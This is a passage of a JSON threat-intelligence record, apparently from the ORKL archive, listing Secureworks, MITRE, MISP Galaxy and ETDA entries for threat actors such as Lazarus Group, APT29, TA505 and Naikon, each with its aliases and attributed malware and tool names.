            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b296f34c-c424-41da-98bf-90312a5df8ef",
            "created_at": "2024-06-19T02:03:08.027585Z",
            "updated_at": "2025-03-27T02:05:17.350153Z",
            "deleted_at": null,
            "main_name": "GOLD DRAKE",
            "aliases": [
                "Indrik Spider ",
                "Evil Corp"
            ],
            "source_name": "Secureworks:GOLD DRAKE",
            "tools": [
                " Cobalt Strike",
                " Covenant",
                " Donut",
                " Dridex",
                " Hades",
                " Koadic",
                " LockBit",
                " Macaw Locker",
                " Mimikatz",
                " Payload.Bin",
                " Phoenix CryptoLocker",
                " PowerSploit",
                " Powershell Empire",
                " SocGholish",
                " WastedLocker",
                "BitPaymer"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "ad154227-6fcf-43c5-a540-0c09534e040f",
            "created_at": "2024-05-01T02:03:07.952927Z",
            "updated_at": "2025-03-27T02:05:17.267077Z",
            "deleted_at": null,
            "main_name": "BRONZE GENEVA",
            "aliases": [
                "BRONZE STERLING ",
                "CTG-5326 ",
                "Naikon ",
                "Override Panda ",
                "APT30 "
            ],
            "source_name": "Secureworks:BRONZE GENEVA",
            "tools": [
                " ShadowPad",
                "Lecna"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2912fc0-c34e-4e4b-82e9-665416c8fe32",
            "created_at": "2023-04-20T02:01:50.979595Z",
            "updated_at": "2025-03-27T02:00:02.79494Z",
            "deleted_at": null,
            "main_name": "Naikon",
            "aliases": [
                "BRONZE GENEVA",
                "G0019",
                "Naikon",
                "BRONZE STERLING",
                "G0013",
                "PLA Unit 78020",
                "OVERRIDE PANDA",
                "Camerashy"
            ],
            "source_name": "MISPGALAXY:Naikon",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bc119938-a79c-4e5f-9d4d-dc96835dfe2e",
            "created_at": "2024-06-04T02:03:07.799286Z",
            "updated_at": "2025-03-27T02:05:17.337094Z",
            "deleted_at": null,
            "main_name": "GOLD BLACKBURN",
            "aliases": [
                "Periwinkle Tempest ",
                "Wizard Spider ",
                "ITG23 "
            ],
            "source_name": "Secureworks:GOLD BLACKBURN",
            "tools": [
                " Buer Loader",
                " Dyre",
                " Team9",
                " TrickBot",
                "BazarLoader"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "40b623c7-b621-48db-b55b-dd4f6746fbc6",
            "created_at": "2024-06-19T02:03:08.017681Z",
            "updated_at": "2025-03-27T02:05:17.342829Z",
            "deleted_at": null,
            "main_name": "GOLD CABIN",
            "aliases": [
                "TA551 ",
                "Shathak"
            ],
            "source_name": "Secureworks:GOLD CABIN",
            "tools": [
                ""
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "5e6b31a6-80e3-4e7d-8b0a-d94897ce9b59",
            "created_at": "2024-06-19T02:03:08.128175Z",
            "updated_at": "2025-03-27T02:05:17.400394Z",
            "deleted_at": null,
            "main_name": "GOLD TAHOE",
            "aliases": [
                "SectorJ04 ",
                "Spandex Tempest ",
                "TA505 ",
                "FIN11 "
            ],
            "source_name": "Secureworks:GOLD TAHOE",
            "tools": [
                " Cobalt Strike",
                " FlawedAmmy",
                " Get2",
                " GraceWire",
                " Malichus",
                " SDBbot",
                " ServHelper",
                " TrueBot",
                "Clop"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a241a1ca-2bc9-450b-a07b-aae747ee2710",
            "created_at": "2024-06-19T02:03:08.150052Z",
            "updated_at": "2025-03-27T02:05:17.409596Z",
            "deleted_at": null,
            "main_name": "IRON RITUAL",
            "aliases": [
                "Blue Dev 5 ",
                "BlueBravo ",
                "Cloaked Ursa ",
                "CozyLarch ",
                "Dark Halo ",
                "Midnight Blizzard ",
                "NOBELIUM ",
                "StellarParticle ",
                "UNC2452 ",
                "APT29"
            ],
            "source_name": "Secureworks:IRON RITUAL",
            "tools": [
                " Cobalt Strike",
                " EnvyScout",
                " GoldFinder",
                " GoldMax",
                " NativeZone",
                " RAINDROP",
                " SUNBURST",
                " Sibot",
                " TEARDROP",
                " VaporRage",
                "Brute Ratel C4"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9f1ce7e3-77cd-4af0-bedb-1643f55c9baf",
            "created_at": "2022-10-25T15:50:23.31611Z",
            "updated_at": "2025-03-27T02:00:55.439974Z",
            "deleted_at": null,
            "main_name": "Naikon",
            "aliases": [
                "Naikon"
            ],
            "source_name": "MITRE:Naikon",
            "tools": [
                "ftp",
                "netsh",
                "WinMM",
                "Systeminfo",
                "RainyDay",
                "RARSTONE",
                "HDoor",
                "Sys10",
                "SslMM",
                "PsExec",
                "Tasklist",
                "Aria-body"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "75d4d6a9-b5d1-4087-a7a0-e4a9587c45f4",
            "created_at": "2022-10-25T15:50:23.5188Z",
            "updated_at": "2025-03-27T02:00:55.489882Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "TA505",
                "Hive0065",
                "Spandex Tempest",
                "CHIMBORAZO"
            ],
            "source_name": "MITRE:TA505",
            "tools": [
                "AdFind",
                "Azorult",
                "FlawedAmmyy",
                "Mimikatz",
                "Dridex",
                "TrickBot",
                "Get2",
                "FlawedGrace",
                "Cobalt Strike",
                "ServHelper",
                "Amadey",
                "SDBbot",
                "PowerSploit"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "20d3a08a-3b97-4b2f-90b8-92a89089a57a",
            "created_at": "2022-10-25T15:50:23.548494Z",
            "updated_at": "2025-03-27T02:00:55.49688Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "APT29",
                "IRON RITUAL",
                "IRON HEMLOCK",
                "NobleBaron",
                "Dark Halo",
                "NOBELIUM",
                "UNC2452",
                "YTTRIUM",
                "The Dukes",
                "Cozy Bear",
                "CozyDuke",
                "SolarStorm",
                "Blue Kitsune",
                "UNC3524",
                "Midnight Blizzard"
            ],
            "source_name": "MITRE:APT29",
            "tools": [
                "PinchDuke",
                "ROADTools",
                "WellMail",
                "CozyCar",
                "Mimikatz",
                "Tasklist",
                "OnionDuke",
                "FatDuke",
                "POSHSPY",
                "EnvyScout",
                "SoreFang",
                "GeminiDuke",
                "GoldMax",
                "FoggyWeb",
                "SDelete",
                "PolyglotDuke",
                "AADInternals",
                "MiniDuke",
                "SeaDuke",
                "Sibot",
                "RegDuke",
                "CloudDuke",
                "GoldFinder",
                "AdFind",
                "PsExec",
                "NativeZone",
                "Systeminfo",
                "ipconfig",
                "Impacket",
                "Cobalt Strike",
                "PowerDuke",
                "QUIETEXIT",
                "HAMMERTOSS",
                "BoomBox",
                "CosmicDuke",
                "WellMess",
                "VaporRage",
                "LiteDuke"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e447d393-c259-46e2-9932-19be2ba67149",
            "created_at": "2022-10-25T16:07:24.28282Z",
            "updated_at": "2025-03-27T02:02:10.159466Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "ATK 103",
                "Chimborazo",
                "Gold Evergreen",
                "Gold Tahoe",
                "Graceful Spider",
                "Hive0065",
                "Operation Tovar",
                "Operation Trident Breach",
                "SectorJ04",
                "Spandex Tempest",
                "TA505",
                "TEMP.Warlock"
            ],
            "source_name": "ETDA:TA505",
            "tools": [
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "Azer",
                "Bart",
                "Bugat v5",
                "CryptFile2",
                "CryptoLocker",
                "CryptoMix",
                "CryptoShield",
                "Dridex",
                "Dudear",
                "EmailStealer",
                "FRIENDSPEAK",
                "Fake Globe",
                "Fareit",
                "FlawedAmmyy",
                "FlawedGrace",
                "FlowerPippi",
                "GOZ",
                "GameOver Zeus",
                "GazGolder",
                "Gelup",
                "Get2",
                "GetandGo",
                "GlobeImposter",
                "Gorhax",
                "GraceWire",
                "Gussdoor",
                "Jaff",
                "Kasidet",
                "Kegotip",
                "Kneber",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Locky",
                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MirrorBlast",
                "Neutrino Bot",
                "Neutrino Exploit Kit",
                "P2P Zeus",
                "Peer-to-Peer Zeus",
                "Philadelphia",
                "Philadephia Ransom",
                "Pony Loader",
                "Rakhni",
                "ReflectiveGnome",
                "Remote Manipulator System",
                "RockLoader",
                "RuRAT",
                "SDBbot",
                "ServHelper",
                "Shifu",
                "Siplog",
                "TeslaGun",
                "TiniMet",
                "TinyMet",
                "Trojan.Zbot",
                "Wsnpoem",
                "Zbot",
                "Zeta",
                "ZeuS",
                "Zeus"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "be597b07-0cde-47bc-80c3-790a8df34af4",
            "created_at": "2022-10-25T16:07:23.407484Z",
            "updated_at": "2025-03-27T02:02:09.784411Z",
            "deleted_at": null,
            "main_name": "Blind Eagle",
            "aliases": [
                "APT-C-36",
                "APT-Q-98",
                "AguilaCiega"
            ],
            "source_name": "ETDA:Blind Eagle",
            "tools": [
                "AsyncRAT",
                "BitRAT",
                "Bladabindi",
                "BlotchyQuasar",
                "Imminent Monitor",
                "Imminent Monitor RAT",
                "Jorik",
                "LimeRAT",
                "Remcos",
                "RemcosRAT",
                "Remvio",
                "Socmer",
                "Warzone",
                "Warzone RAT",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f27790ff-4ee0-40a5-9c84-2b523a9d3270",
            "created_at": "2022-10-25T16:07:23.341684Z",
            "updated_at": "2025-03-27T02:02:09.74554Z",
            "deleted_at": null,
            "main_name": "APT 29",
            "aliases": [
                "APT 29",
                "ATK 7",
                "Blue Dev 5",
                "BlueBravo",
                "Cloaked Ursa",
                "CloudLook",
                "Cozy Bear",
                "Dark Halo",
                "Earth Koshchei",
                "Grizzly Steppe",
                "Group 100",
                "ITG11",
                "Iron Hemlock",
                "Iron Ritual",
                "Midnight Blizzard",
                "Minidionis",
                "Nobelium",
                "NobleBaron",
                "Operation Ghost",
                "Operation Office monkeys",
                "Operation StellarParticle",
                "SilverFish",
                "Solar Phoenix",
                "SolarStorm",
                "StellarParticle",
                "TEMP.Monkeys",
                "The Dukes",
                "UNC2452",
                "UNC3524",
                "Yttrium"
            ],
            "source_name": "ETDA:APT 29",
            "tools": [
                "7-Zip",
                "ATI-Agent",
                "AdFind",
                "Agentemis",
                "AtNow",
                "BEATDROP",
                "BotgenStudios",
                "CEELOADER",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobalt Strike",
                "CobaltStrike",
                "CosmicDuke",
                "Cozer",
                "CozyBear",
                "CozyCar",
                "CozyDuke",
                "Danfuan",
                "EnvyScout",
                "EuroAPT",
                "FatDuke",
                "FoggyWeb",
                "GeminiDuke",
                "Geppei",
                "GoldFinder",
                "GoldMax",
                "GraphDrop",
                "GraphicalNeutrino",
                "GraphicalProton",
                "HAMMERTOSS",
                "HammerDuke",
                "LOLBAS",
                "LOLBins",
                "LiteDuke",
                "Living off the Land",
                "MagicWeb",
                "Mimikatz",
                "MiniDionis",
                "MiniDuke",
                "NemesisGemina",
                "NetDuke",
                "OnionDuke",
                "POSHSPY",
                "PinchDuke",
                "PolyglotDuke",
                "PowerDuke",
                "QUIETEXIT",
                "ROOTSAW",
                "RegDuke",
                "Rubeus",
                "SNOWYAMBER",
                "SPICYBEAT",
                "SUNSHUTTLE",
                "SeaDaddy",
                "SeaDask",
                "SeaDesk",
                "SeaDuke",
                "Sharp-SMBExec",
                "SharpView",
                "Sibot",
                "Solorigate",
                "SoreFang",
                "TinyBaron",
                "WINELOADER",
                "WellMail",
                "WellMess",
                "cobeacon",
                "elf.wellmess",
                "reGeorg",
                "tDiscoverer"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b69484be-98d1-49e6-aed1-a28dbf65176a",
            "created_at": "2022-10-25T16:07:23.886782Z",
            "updated_at": "2025-03-27T02:02:10.014032Z",
            "deleted_at": null,
            "main_name": "Naikon",
            "aliases": [
                "Hellsing",
                "ITG06",
                "Lotus Panda",
                "Naikon",
                "Operation CameraShy"
            ],
            "source_name": "ETDA:Naikon",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "AR",
                "ARL",
                "Agent.dhwf",
                "Aria-body",
                "Aria-body loader",
                "Asset Reconnaissance Lighthouse",
                "BackBend",
                "Creamsicle",
                "Custom HDoor",
                "Destroy RAT",
                "DestroyRAT",
                "Flashflood",
                "FoundCore",
                "Gemcutter",
                "HDoor",
                "JadeRAT",
                "Kaba",
                "Korplug",
                "LOLBAS",
                "LOLBins",
                "LadonGo",
                "Lecna",
                "Living off the Land",
                "NBTscan",
                "Naikon",
                "NetEagle",
                "Neteagle_Scout",
                "NewCore RAT",
                "Orangeade",
                "PlugX",
                "Quarks PwDump",
                "RARSTONE",
                "RainyDay",
                "RedDelta",
                "RoyalRoad",
                "Sacto",
                "Sandboxie",
                "ScoutEagle",
                "Shipshape",
                "Sisfader",
                "Sisfader RAT",
                "Sogu",
                "SslMM",
                "Sys10",
                "TIGERPLUG",
                "TVT",
                "TeamViewer",
                "Thoper",
                "WinMM",
                "Xamtrav",
                "XsFunction",
                "ZRLnk",
                "nbtscan",
                "nokian",
                "norton",
                "xsControl",
                "xsPlus"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716501,
    "ts_updated_at": 1743041844,
    "ts_creation_date": 1624962289,
    "ts_modification_date": 1624962386,
    "files": {
        "pdf": "https://archive.orkl.eu/e40d9c0eb0646382435e1931ce010cb59ce0b3b9.pdf",
        "text": "https://archive.orkl.eu/e40d9c0eb0646382435e1931ce010cb59ce0b3b9.txt",
        "img": "https://archive.orkl.eu/e40d9c0eb0646382435e1931ce010cb59ce0b3b9.jpg"
    }
}